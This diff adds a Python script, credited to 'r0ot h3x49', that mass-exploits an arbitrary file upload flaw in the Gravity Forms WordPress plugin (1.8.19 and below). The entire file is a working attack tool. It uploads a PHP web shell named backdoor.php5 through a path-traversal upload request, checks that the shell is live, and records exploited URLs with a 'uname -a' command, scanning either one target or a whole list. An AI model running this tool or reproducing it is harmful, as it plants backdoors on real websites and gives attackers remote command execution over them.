@@ -1,0 +1,231 @@
+#!/usr/bin/python
+#############################################################################################################
+#                           WordPress Plugin Automated Shell uploading                                      #
+#                           Gravity Forms [WP] - Arbitrary File Upload                                      #
+#                           Vulnerable Version(s) : 1.8.19 (and below)                                      #
+# Source : https://blog.sucuri.net/2015/02/malware-cleanup-to-arbitrary-file-upload-in-gravity-forms.html   #
+#                                Author: Nasir khan (r0ot h3x49)                                            #
+#############################################################################################################
+import os
+import sys
+import time
+import json
+import optparse
+import urllib.request as urllib2
+
+from pprint import pprint
+from colorama import init
+from colorama import Fore
+from colorama import Style
+
+# Initialize colorama ..
+init(autoreset=True, convert=bool(os.name=="nt"))
+# foreground color ..
+fr  =   Fore.RED
+fc  =   Fore.CYAN
+fw  =   Fore.WHITE
+fg  =   Fore.GREEN
+# color style ..
+sd  =   Style.DIM
+sn  =   Style.NORMAL
+sb  =   Style.BRIGHT
+
+def _banner():
+    ban = """{}{}+------------------------------------------------------------+
+|    _____                 _ _         ______    _ _         | 
+|   / ____|               (_) |       |  ____|  | | |        |
+|  | |  __ _ __ __ ___   ___| |_ _   _| |__ __ _| | |___     |
+|  | | |_ | '__/ _` \ \ / / | __| | | |  __/ _` | | / __|    |
+|  | |__| | | | (_| |\ V /| | |_| |_| | | | (_| | | \__ \    |
+|   \_____|_|  \__,_| \_/ |_|\__|\__, |_|  \__,_|_|_|___/    |
+|                                 __/ |                      |
+|                                |___/  - By r0ot@h3x49      |
+| ---------------------------------------------------------- |
+|               WordPress Plugin Gravity Form                |
+|         Gravity Forms [WP] - Arbitrary File Upload         |
+|              Version(s) : 1.8.19 (and below)               |
++------------------------------------------------------------+""".format(fc, sb)
+    return ban
+
+def _prepare(target):
+    if "http://" in target or "https://" in target:
+        _url    =   '{}/?gf_page=upload'.format(target)
+    else:
+        _url    =   'http://{}/?gf_page=upload'.format(target)
+    _data   = '<?php system($_GET["cmd"]); ?>&field_id=3&form_id=1&gform_unique_id=../../../../&name=backdoor.php5'
+    return _url, _data
+
+def _prepare_verify_url(target):
+    if "http://" in target or "https://" in target:
+        _url    =   '{}/wp-content/_input_3_backdoor.php5'.format(target)
+    else:
+        _url    =   'http://{}/wp-content/_input_3_backdoor.php5'.format(target)
+    return _url
+
+def _verify(url):
+    try:
+        resp    =   urllib2.urlopen(url).read()
+    except urllib2.HTTPError as e:
+        _json_resp  = {"status" : "failed"}
+    except urllib2.URLError as e:
+        _json_resp  = {"status" : "failed"}
+    except KeyboardInterrupt as e:
+        sys.stdout.write('\n{}{}[-] User Interrupted\n'.format(fr, sd))
+        exit(0)
+    else:
+        if 'backdoor.php5' in resp:
+            _json_resp  = {"status" : "ok"}
+        else:
+            _json_resp  = {"status" : "failed"}
+    return _json_resp
+
+def _exploit(url, payload=None):
+    try:
+        if payload:
+            payload = payload.encode("utf-8")
+        resp    =   urllib2.urlopen(url, data=payload)
+    except urllib2.HTTPError as e:
+        _json_resp  = {"status" : "failed"}
+    except urllib2.URLError as e:
+        _json_resp  = {"status" : "failed"}
+    except KeyboardInterrupt as e:
+        sys.stdout.write('\n{}{}[-] User Interrupted\n'.format(fr, sd))
+        exit(0)
+    else:
+        try:
+            _json_resp  = json.load(resp)
+        except:
+            _json_resp  = {"status" : "failed"}
+    return _json_resp
+
+def _is_vulnerable(url):
+    try:
+        resp    =   urllib2.urlopen(url)
+    except urllib2.HTTPError as e:
+        _json_resp  = {"status" : "failed"}
+    except urllib2.URLError as e:
+        _json_resp  = {"status" : "failed"}
+    except KeyboardInterrupt as e:
+        sys.stdout.write('\n{}{}[-] User Interrupted\n'.format(fr, sd))
+        exit(0)
+    else:
+        try:
+            _json_resp  = json.load(resp)
+        except:
+            _json_resp  = {"status" : "failed"}
+    return _json_resp
+
+
+def main():
+    banner      =   _banner()
+    usage       = '''%prog [-h] [-u "target"] [-t "targets.txt"][-v]'''
+    parser      =   optparse.OptionParser(usage=usage,conflict_handler="resolve")
+
+    sys.stdout.write('{}\n\n'.format(banner))
+    parser.add_option("-v", "--vuln",dest="vuln", action='store_true',
+                      help="Only identify if target is vulnerable.")
+    parser.add_option("-u", dest="target", type="string" , \
+                      help="Target url to check (e.g:- http://abc.com)")
+    parser.add_option("-t",dest="filename", type="string" , \
+                      help="File containg list of targets (e.g:- <filename>.txt)")
+
+    (options, args) = parser.parse_args()
+    if not options.target and not options.filename:
+        parser.print_help()
+    elif options.target and not options.filename:
+        target      =   options.target
+        url, data   =   _prepare(target)
+        sys.stdout.write('{}{}[*] {}'.format(fg, sd, target))
+        response    =   _is_vulnerable(url)
+        status      =   response.get('status')
+        if status == 'failed':
+            sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}not vulnerable{}{})'.format(fg, sd, target, fw, sb, fg, sd))
+            print("")
+        elif status == 'error':
+            sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}vulnerable{}{})'.format(fg, sd, target, fr, sb, fg, sd))
+            print("")
+            if options.vuln:
+                with open("vulnerable.txt", "a") as f:
+                    f.write('{}\n'.format(target))
+                f.close()
+            else:
+                with open("vulnerable.txt", "a") as f:
+                    f.write('{}\n'.format(target))
+                f.close()
+                sys.stdout.write('{}{}[*] trying to exploit '.format(fg, sd))
+                response    =   _exploit(url, payload=data)
+                status      =   response.get('status')
+                if status == 'failed':
+                    sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}failed{}{})'.format(fg, sd, "trying to exploit", fr, sb, fg, sd))
+                    print("")
+                elif status == 'error':
+                    sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}failed{}{})'.format(fg, sd, "trying to exploit", fr, sb, fg, sd))
+                    print("")
+                elif status == 'ok':
+                    sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}exploited{}{})'.format(fg, sd, "trying to exploit", fc, sb, fg, sd))
+                    print("")
+                    sys.stdout.write('{}{}[*] trying to verify '.format(fg, sd))
+                    url         =   _prepare_verify_url(target)
+                    response    =   _verify(url)
+                    status      =   response.get("status")
+                    if status == "failed":
+                        sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}failed{}{})'.format(fg, sd, "trying to verify", fr, sb, fg, sd))
+                    elif status == "ok":
+                        sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}successful{}{})'.format(fg, sd, "trying to verify", fg, sb, fg, sd))
+                        print("")
+                        with open("exploited.txt", "a") as f:
+                            f.write('{}?cmd=uname -a\n'.format(url))
+                        f.close()
+    elif options.filename and not options.target:
+        filename    =   options.filename
+        f_in        =   open(filename)
+        targets     =   set(list(line for line in (l.strip() for l in f_in) if line))
+        for target in targets:
+            sys.stdout.write('{}{}[*] {}'.format(fg, sd, target))
+            url, data   =   _prepare(target)
+            response    =   _is_vulnerable(url)
+            status      =   response.get('status')
+            if status == 'failed':
+                sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}not vulnerable{}{})'.format(fg, sd, target, fw, sb, fg, sd))
+                print("")
+            elif status == 'error':
+                sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}vulnerable{}{})'.format(fg, sd, target, fr, sb, fg, sd))
+                print("")
+                if options.vuln:
+                    with open("vulnerable.txt", "a") as f:
+                        f.write('{}\n'.format(target))
+                    f.close()
+                else:
+                    with open("vulnerable.txt", "a") as f:
+                        f.write('{}\n'.format(target))
+                    f.close()
+                    sys.stdout.write('{}{}[*] trying to exploit '.format(fg, sd))
+                    response    =   _exploit(url, payload=data)
+                    status      =   response.get('status')
+                    if status == 'failed':
+                        sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}failed{}{})'.format(fg, sd, "trying to exploit", fr, sb, fg, sd))
+                        print("")
+                    elif status == 'error':
+                        sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}failed{}{})'.format(fg, sd, "trying to exploit", fr, sb, fg, sd))
+                        print("")
+                    elif status == 'ok':
+                        sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}exploited{}{})'.format(fg, sd, "trying to exploit", fc, sb, fg, sd))
+                        print("")
+                        sys.stdout.write('{}{}[*] trying to verify '.format(fg, sd))
+                        url         =   _prepare_verify_url(target)
+                        response    =   _verify(url)
+                        status      =   response.get("status")
+                        if status == "failed":
+                            sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}failed{}{})'.format(fg, sd, "trying to verify", fr, sb, fg, sd))
+                        elif status == "ok":
+                            sys.stdout.write('\r\r\r{}{}[*] {:<50} : ({}{}successful{}{})'.format(fg, sd, "trying to verify", fg, sb, fg, sd))
+                            print("")
+                            with open("exploited.txt", "a") as f:
+                                f.write('{}?cmd=uname -a\n'.format(url))
+                            f.close()
+if __name__ == '__main__':
+    try:
+        main()
+    except KeyboardInterrupt:
+        sys.stdout.write('\n{}{}[-] User Interrupted\n'.format(fr, sd))
+        exit(0)
